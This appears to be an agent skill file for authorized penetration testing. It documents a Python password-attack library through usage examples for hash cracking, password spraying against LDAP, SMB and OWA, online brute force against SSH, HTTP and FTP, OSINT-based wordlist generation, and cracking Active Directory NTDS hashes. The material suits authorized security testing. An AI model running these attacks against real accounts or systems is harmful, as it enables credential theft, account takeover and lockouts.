---
name: password-attacks
description: |
  Password security assessment including cracking, spraying, and brute force.
  Test password policies, crack hashes, and identify weak credentials.
  Use for password security testing during authorized assessments.
license: Apache-2.0
compatibility: |
  - Python 3.9+
  - Optional: hashcat, john integration
metadata:
  author: SherifEldeeb
  version: "1.0.0"
  category: pentesting
---

# Password Attacks Skill

Password security assessment capabilities for authorized penetration testing.

## Capabilities

- **Hash Cracking**: Crack various hash types
- **Password Spraying**: Spray passwords across users
- **Brute Force**: Online brute force attacks
- **Rule Generation**: Create password mutation rules
- **Wordlist Generation**: Generate targeted wordlists
- **Password Analysis**: Analyze password patterns
- **Credential Stuffing**: Test credential reuse
- **Hash Identification**: Identify hash types

## Quick Start

```python
from password_utils import HashCracker, PasswordSprayer, WordlistGenerator

# Crack hashes
cracker = HashCracker()
cracker.add_hash('5f4dcc3b5aa765d61d8327deb882cf99', 'md5')
results = cracker.crack_dictionary('rockyou.txt')

# Password spraying
sprayer = PasswordSprayer('domain.local')
sprayer.add_users(['admin', 'user1', 'user2'])
hits = sprayer.spray(['Winter2024!', 'Summer2024!'])

# Generate wordlist
generator = WordlistGenerator('TargetCorp')
wordlist = generator.generate_targeted()
```

## Usage

### Hash Cracking

Crack password hashes using various techniques.

**Example**:
```python
from password_utils import HashCracker

cracker = HashCracker()

# Add hashes
cracker.add_hash('5f4dcc3b5aa765d61d8327deb882cf99', 'md5')
cracker.add_hash('e10adc3949ba59abbe56e057f20f883e', 'md5')
cracker.add_hash('$2a$10$...', 'bcrypt')

# Import hashes from file
cracker.import_hashes('hashes.txt', auto_detect=True)

# Dictionary attack
results = cracker.crack_dictionary('rockyou.txt')
for result in results:
    print(f"{result['hash']} : {result['password']}")

# Dictionary with rules
results = cracker.crack_with_rules('wordlist.txt', 'best64.rule')

# Brute force (short passwords)
results = cracker.crack_brute_force(
    charset='?l?d',
    min_length=4,
    max_length=6
)

# Mask attack
results = cracker.crack_mask('?u?l?l?l?d?d?d?d')

# Combinator attack
results = cracker.crack_combinator('words1.txt', 'words2.txt')

# Get statistics
stats = cracker.get_stats()
print(f"Total: {stats['total']}, Cracked: {stats['cracked']}")

# Export results
cracker.export_results('cracked.txt')
```

### Hash Identification

Identify hash types.

**Example**:
```python
from password_utils import HashIdentifier

identifier = HashIdentifier()

# Identify single hash
hash_type = identifier.identify('5f4dcc3b5aa765d61d8327deb882cf99')
print(f"Type: {hash_type['type']}")
print(f"Hashcat mode: {hash_type['hashcat']}")
print(f"John format: {hash_type['john']}")

# Identify multiple hashes
hashes = [
    '5f4dcc3b5aa765d61d8327deb882cf99',
    'e10adc3949ba59abbe56e057f20f883e123456',
    '$2a$10$N9qo8uLOickgx2ZMRZoMy...'
]
for h in hashes:
    result = identifier.identify(h)
    print(f"{h[:20]}... -> {result['type']}")

# Get hash examples
examples = identifier.get_examples('ntlm')
```

### Password Spraying

Spray passwords across multiple users.

**Example**:
```python
from password_utils import PasswordSprayer

sprayer = PasswordSprayer('domain.local')

# Add targets
sprayer.add_users(['admin', 'jsmith', 'jdoe', 'administrator'])
sprayer.import_users('users.txt')

# Configure target
sprayer.set_target('ldap', '192.168.1.10', 389)
# or
sprayer.set_target('smb', '192.168.1.10', 445)
# or
sprayer.set_target('owa', 'https://mail.domain.com')

# Set spray options
sprayer.set_delay(30)  # 30 minutes between sprays
sprayer.set_lockout_threshold(5)

# Single password spray
hits = sprayer.spray(['Winter2024!'])

# Multiple passwords with delay
passwords = ['Spring2024!', 'Summer2024!', 'Fall2024!']
hits = sprayer.spray(passwords, delay_minutes=60)

# Get valid credentials
for cred in hits:
    print(f"{cred['username']}:{cred['password']}")

# Export results
sprayer.export_results('spray_results.json')
```

### Brute Force Attacks

Online brute force attacks.

**Example**:
```python
from password_utils import BruteForcer

brute = BruteForcer()

# SSH brute force
results = brute.attack_ssh(
    target='192.168.1.100',
    username='root',
    wordlist='passwords.txt',
    threads=4
)

# HTTP Basic Auth
results = brute.attack_http_basic(
    url='https://target.com/admin',
    username='admin',
    wordlist='passwords.txt'
)

# HTTP Form
results = brute.attack_http_form(
    url='https://target.com/login',
    username='admin',
    wordlist='passwords.txt',
    username_field='email',
    password_field='password',
    success_indicator='Welcome',
    failure_indicator='Invalid'
)

# FTP brute force
results = brute.attack_ftp(
    target='192.168.1.100',
    username='admin',
    wordlist='passwords.txt'
)

# SMB brute force
results = brute.attack_smb(
    target='192.168.1.100',
    username='admin',
    wordlist='passwords.txt'
)

print(f"Password found: {results['password']}")
```

### Wordlist Generation

Generate targeted wordlists.

**Example**:
```python
from password_utils import WordlistGenerator

generator = WordlistGenerator('TargetCorp')

# Add base words
generator.add_words(['target', 'corp', 'company', 'secure'])

# Add numbers and years
generator.add_numbers(range(0, 100))
generator.add_years(range(2020, 2025))

# Add common patterns
generator.add_common_patterns()

# Apply mutations
generator.apply_mutations([
    'capitalize',
    'uppercase',
    'leet_speak',
    'append_special',
    'append_numbers'
])

# Generate wordlist
wordlist = generator.generate()
print(f"Generated {len(wordlist)} passwords")

# Generate targeted from OSINT
generator.add_from_linkedin('TargetCorp')
generator.add_from_website('https://target.com')
targeted = generator.generate_targeted()

# Export
generator.export('custom_wordlist.txt')

# Create rule file
rules = generator.generate_rules()
generator.export_rules('custom.rule')
```

### Password Analysis

Analyze password patterns and policies.

**Example**:
```python
from password_utils import PasswordAnalyzer

analyzer = PasswordAnalyzer()

# Load cracked passwords
analyzer.load_passwords('cracked.txt')

# Analyze patterns
analysis = analyzer.analyze()
print(f"Total passwords: {analysis['total']}")
print(f"Average length: {analysis['avg_length']}")
print(f"With numbers: {analysis['with_numbers']}%")
print(f"With special: {analysis['with_special']}%")

# Common patterns
patterns = analyzer.find_patterns()
print(f"Top patterns: {patterns['top']}")
print(f"Common bases: {patterns['bases']}")

# Check against policy
policy_check = analyzer.check_policy({
    'min_length': 12,
    'require_upper': True,
    'require_lower': True,
    'require_number': True,
    'require_special': True
})
print(f"Policy violations: {policy_check['violations']}%")

# Generate report
report = analyzer.generate_report()
print(report)
```

### Rule Generation

Create password mutation rules.

**Example**:
```python
from password_utils import RuleGenerator

rules = RuleGenerator()

# Generate rules from password pairs
rules.learn_from_pairs([
    ('password', 'P@ssw0rd!'),
    ('summer', 'Summer2024!'),
    ('company', 'C0mp@ny!')
])

# Generate standard rules
rules.add_case_rules()
rules.add_leet_rules()
rules.add_append_rules(['!', '@', '#', '123', '2024'])
rules.add_prepend_rules(['!', '@'])

# Combine rules
rules.combine_rules(max_depth=2)

# Export
rules.export_hashcat('custom.rule')
rules.export_john('custom.rule')

# Test rules on wordlist
coverage = rules.test_coverage('wordlist.txt', 'target_hashes.txt')
print(f"Coverage: {coverage}%")
```

## Configuration

### Environment Variables

| Variable | Description | Required | Default |
|----------|-------------|----------|---------|
| `HASHCAT_PATH` | Path to hashcat binary | No | Auto-detect |
| `JOHN_PATH` | Path to john binary | No | Auto-detect |
| `WORDLIST_DIR` | Wordlist directory | No | `/usr/share/wordlists` |

## Examples

### Example 1: Full Hash Cracking Campaign

**Scenario**: Crack Active Directory hashes

```python
# Import NTDS hashes
cracker = HashCracker()
cracker.import_hashes('ntds.txt', hash_type='ntlm')

# Stage 1: Dictionary
cracker.crack_dictionary('rockyou.txt')

# Stage 2: Dictionary + Rules
cracker.crack_with_rules('rockyou.txt', 'best64.rule')

# Stage 3: Targeted wordlist
generator = WordlistGenerator('TargetCorp')
targeted = generator.generate_targeted()
cracker.crack_dictionary(targeted)

# Stage 4: Mask attack
cracker.crack_mask('?u?l?l?l?l?d?d?d!')

# Results
print(f"Cracked: {cracker.get_stats()['cracked']}/{cracker.get_stats()['total']}")
```

## Limitations

- **Computation Time**: Cracking can take significant time
- **Lockout Risk**: Online attacks may trigger lockouts
- **Resources**: GPU recommended for hash cracking

## Related Skills

- [post-exploitation](../post-exploitation/): Credential harvesting
- [active-directory-testing](../active-directory-testing/): Domain password attacks
- [reconnaissance](../reconnaissance/): Gather password hints
- [pentest-reporting](../pentest-reporting/): Document findings

## References

- [Hashcat Wiki](https://hashcat.net/wiki/)
- [John the Ripper](https://www.openwall.com/john/)
- [SecLists Passwords](https://github.com/danielmiessler/SecLists)
